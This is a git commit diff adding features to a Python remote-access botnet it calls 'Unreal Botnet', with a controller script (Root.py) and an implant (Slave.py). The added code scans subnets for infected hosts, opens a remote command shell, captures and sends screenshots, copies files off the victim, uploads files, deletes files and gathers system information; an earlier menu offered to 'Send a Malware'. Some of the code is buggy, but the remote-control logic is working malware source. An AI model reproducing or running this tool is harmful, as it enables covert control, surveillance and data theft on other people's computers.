576474d72f3315d6cdd1c6e1cf73a18d0dab9a7d
thebarcode <thebarcode15@gmail.com>
2016-12-22 11:00:09 -0200

    Add files via upload
    New functions.

--- Root.py
+++ Root.py
@@ -6,6 +6,10 @@ import sys
 import subprocess
 import ipaddress
 import time
+import platform
+import os
+
+unrealport = 1255
 
 def Scan():
 	print '1. Scan all\n2. Scan only one'
@@ -13,38 +17,34 @@ def Scan():
 	if len(c) == 0: sys.exit(0)
 	elif c == '1':
 		Slaves = []
-		print 'Address: [Ex: 192.168.1.0/24'
+		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		socket.setdefaulttimeout(.5)
+		print 'Address: [Ex: 192.168.1.0/24]'
 		hostin = raw_input('>')
 		if len(hostin) == 0: sys.exit(0)
 		ip_net = ipaddress.ip_network(unicode(hostin))
 		all_hosts = list(ip_net.hosts())
-		for i in range(len(all_hosts)):
-			try:
-				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-				result = s.connect_ex((str(all_hosts[i]), 152))
-				if result == 0:
-					Slaves.append(str(all_hosts[i]))
-				else:
-					pass
-			except socket.error as e :
-				print e
-			except KeyboardInterrupt:
-				print 'You pressed Ctrl+C'
-				sys.exit(0)
-		print str(Slaves)
+		for i in range(0, len(all_hosts)):
+			result = sock.connect_ex((unicode(all_hosts[i]), 1232))
+			if result == 0:
+				print 'Slave found! :'+ s
+			else:
+				print unicode(all_hosts[i]), ' Not founded...'
+				continue
 	elif c == '2':
 		Slaves = []
-		print 'Host Address'
+		print 'Host Address:'
 		host = raw_input('>')
 		if len(host) == 0: sys.exit(0)
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			result = s.connect_ex((host, 152))
+			result = s.connect_ex((host, unrealport))
 			if result == 0:
 				Slaves.append(host)
 				print "-" * 15
-				print '|' +str(Slaves)+'|'
+				print '| Slave found! :' +str(Slaves)+'|'
 				print '-' * 15
+				s.close()
 			else:
 				print 'Host without the Unreal Botnet'
 		except KeyboardInterrupt:
@@ -52,41 +52,125 @@ def Scan():
 			sys.exit(0)
 		except socket.error as e:
 			print e
-def control(host, port):
+def control(host):
+	once = True
 	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	result = sock.connect((host, int(port)))
+	result = sock.connect((host,unrealport))
 	subprocess.call('clear', shell=True)
 	print 'Connected!'
-	print '1. Return the Shell\n2. Close Connection\n3. Remove [X]\n4. Send a Malware\n5. Exit'
+	print '1. Return the Shell\n2. Close Connection\n3. Remove [X]\n4. Exit'
 	s = raw_input('>')
 	if len(s) == 0: sys.exit(0)
 	elif s == '1':
+		PATH = '$'
+		UNAME = ''
 		while True:
-			cmd = raw_input('>')
-			if len(cmd) == 0: print 'Not Empty'
+			if once:
+				sock.send('uname')
+				d = sock.recv(1024)
+				osn = d.split('?', 4)
+				print '| Name: ', osn[0], 'OS:', osn[1]+','+osn[2]+'|'
+				print'|'+osn[3]+'|'
+				print '|Architeture: '+osn[4]+'|'
+				UNAME = osn[0]
+				once = False
+				d = ''
+			cmd = raw_input(UNAME+'@'+PATH+'>')
+			if len(cmd) == 0:
+				print "Can't be empty"
+				continue
 			if cmd[:5] == 'where':
 				sock.send('whereis')
 				d = sock.recv(1024)
-				print d
+				PATH = d
 				d = ''
 			elif cmd[:3] == 'cd ':
 				sock.send(cmd)
 				while True:
 					bd = sock.recv(1024)
-					print bd
-					bd = ''
-					break
-			else:
-				if cmd[:5] == '.exit':
-					sock.send('rexit')
-					break
-				else:
-					sock.send(cmd)
-					while True:
-						data = sock.recv(1024)
-						print data
-						data = ''
+					if bd[:4] == 'err+':
+						x = bd.split('+', 1)
+						print x[1]
 						break
+					else:
+						PATH = bd
+						bd = ''
+						break
+			elif cmd[:6] == 'sysinf':
+				sock.send('sysinf')
+				d = sock.recv(1024)
+				print d
+				d = ''
+			elif cmd[:7] == 'print()':
+				sock.send('print')
+				d = sock.recv(1024)
+				if d[:5] == 'imgok':
+					sock.send('send')
+					d = ''
+					l = sock.recv(1024)
+					f = open(os.getcwd()+'/screenshot.png', 'wb')
+					while (l):
+						f.write(l)
+						l = sock.recv(1024)
+					f.close()
+					print 'Received.. check {}'.format(os.getcwd())
+					main()
+			elif cmd[:5] == 'uname':
+				sock.send('uname')
+				d = sock.recv(1024)
+				un = d.split('?', 2)
+				print 'PC name: {}\nOS: {}, {}'.format(un[0], un[1], un[2])
+				d = ''
+			elif cmd[:4] == 'copy':
+				sock.send('copyfile')
+				d = sock.recv(1024)
+				if d[:2] == 'ok':
+					path = raw_input('FILE PATH>')
+					if path == 'exit': break
+					spath = raw_input('PATH TO SAVE>')
+					if spath == 'exit': break
+					sock.send(path)
+					f = open(spath, 'wb')
+					l = sock.recv(1024)
+					while (l):
+						print 'Receiving...'
+						f.write(l)
+						l = sock.recv(1024)
+					f.close()
+					print 'Done...'
+					main()
+			elif cmd[:3] == 'rem':
+				sock.send(cmd)
+				print sock.recv(1024)
+			elif cmd[:3] == 'put':
+				sock.send('sendfile')
+				data = sock.recv(1024)
+				if data[:6] == 'ready':
+					path = raw_input('PATH>')
+					spath = raw_input('PATH TO>')
+					f = open(path, 'rb')
+					sock.send(spath)
+					print 'Sending..'
+					l = f.read(1024)
+					while (l):
+						sock.send(l)
+						l = f.read(1024)
+					f.close()
+					print 'Done..'
+					time.sleep(1)
+					sock.close()
+					main()
+			elif cmd[:5] == '.exit':
+				sock.send('rexit')
+				main()
+			else:
+				sock.send(cmd)
+				while True:
+					data = sock.recv(1024)
+					if len(data) == 0: break
+					print data
+					data = ''
+					break
 	elif s == '2':
 		sock.close()
 		print 'Closed.'
@@ -96,23 +180,9 @@ def control(host, port):
 		print 'Removed'
 		main()
 	elif s == '4':
-		sock.send('sendfile')
-		data = sock.recv(1024)
-		if data[:6] == 'ready':
-			path = raw_input('PATH>')
-			spath = raw_input('PATH TO>')
-			f = open(path, 'rb')
-			sock.send(spath)
-			print 'Sending..'
-			l = f.read(1024)
-			while (l):
-				sock.send(l)
-				l = f.read(1024)
-			f.close()
-			print 'Done..'
-			time.sleep(1)
-			sock.close()
-			main()
+		sock.send('close')
+		sock.close()
+		main()
 def main():
 	while True:
 		print '1. Connect\n2. Scan for slaves\n3.Exit'
@@ -121,9 +191,7 @@ def main():
 		elif r == '1':
 			h = raw_input('>')
 			if len(h) == 0: break
-			p = raw_input('>')
-			if len(p) == 0: break
-			control(h, p)
+			control(h)
 		elif r == '2':
 			Scan()
 		elif r == '3':
--- Slave.py
+++ Slave.py
@@ -7,16 +7,16 @@ import subprocess
 import sys
 import time
 from datetime import datetime
-
+import platform
 
 def Execute(command):
-	p = subprocess.Popen([command],stdout=subprocess.PIPE, stderr=subprocess.PIPE , shell=True)
+	p = subprocess.Popen([command],stdout=subprocess.PIPE, stderr=subprocess.STDOUT , shell=True)
 	return p.stdout.read()
 
 if __name__ == '__main__':
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.bind(('127.0.0.1', 152))
+		s.bind(('127.0.0.1', 1255))
 		s.listen(1)
 		while True:
 			con, cli = s.accept()
@@ -25,18 +25,50 @@ if __name__ == '__main__':
 				data = con.recv(1024)
 				if data[:7] == 'whereis':
 					con.send(os.getcwd())
+					data = ''
 				elif data[:3] == 'cd ':
 					din = data.split(' ', 1)
 					print din[1]
 					try:
 						os.chdir(din[1])
 						con.send(os.getcwd())
+						data = ''
 					except os.error as e:
-						con.send(str(e))
+						con.send('err+'+str(e))
+						data = ''
 						pass
+				elif data[:3] == 'rem':
+					path = data.split(' ', 1)
+					os.remove(path[1])
+					con.send('Removed: '+path[1])
+					data = ''
 				elif data[:5] == 'rexit':
-					break
-					print 'Closed Connection, waiting...'
+					print 'Closed Connection with {}, waiting...'.format(cli)
+					con.close()
+				elif data[:5] == 'close':
+					con.close()
+					print 'Closing with: ', cli
+				elif data[:5] == 'print':
+					app = wx.App(False)
+					SD = wx.ScreenDC()
+					wid, hei = SD.Size.Get()
+					b = wx.EmptyBitmap(wid, hei)
+					m = wx.MemoryDCFromDC(SD)
+					m.SelectObject(b)
+					m.Blit(0,0,wid,hei,SD,0,0)
+					m.SelectObject(wx.NullBitmap)
+					b.SaveFile(os.getcwd()+'/screenshot.png', wx.BITMAP_TYPE_PNG)
+					con.send('imgok')
+					if con.recv(1024)[:4] == 'send':
+						f = open(os.getcwd()+'/screenshot.png', 'rb')
+						l = f.read()
+						while (l):
+							con.send(l)
+							l = f.read()
+						f.close()
+						print 'Sended print'
+						con.close()
+						data = ''
 				elif data[:8] == 'rootexit':
 					sys.exit(0)
 				elif data[:8] == 'sendfile':
@@ -50,11 +82,39 @@ if __name__ == '__main__':
 						f.write(l)
 						l = con.recv(1024)
 					f.close()
+					l = ''
 					print 'Received..'
 					break
+				elif data[:8] == 'copyfile':
+					con.send('ok')
+					x = con.recv(1024)
+					f = open(x, 'rb')
+					l = f.read(1024)
+					while (l):
+						print 'Sending...'
+						con.send(l)
+						l = f.read(1024)
+					f.close()
+					print 'Done.'
+					time.sleep(1)
+					con.close()
+					x = ''
+				elif data[:5] == 'uname':
+					con.send(platform.uname()[1]+'?'+platform.uname()[0]+'?'+platform.uname()[2]+'?'+platform.uname()[3]+'?'+platform.uname()[4])
+					data = ''
+				elif data[:6] == 'sysinf':
+					if platform.system() == 'Linux':
+						r = Execute('sudo lscpu')
+						con.send(r)
+						r = ''
+					elif platform.system() == 'Windows':
+						r = Execute('systeminfo')
+						con.send(r)
+						r = ''
 				while data != '':
 					r = Execute(data)
 					con.send(r)
+					r = ''
 					print 'Executed..'
 					break
 	except KeyboardInterrupt:
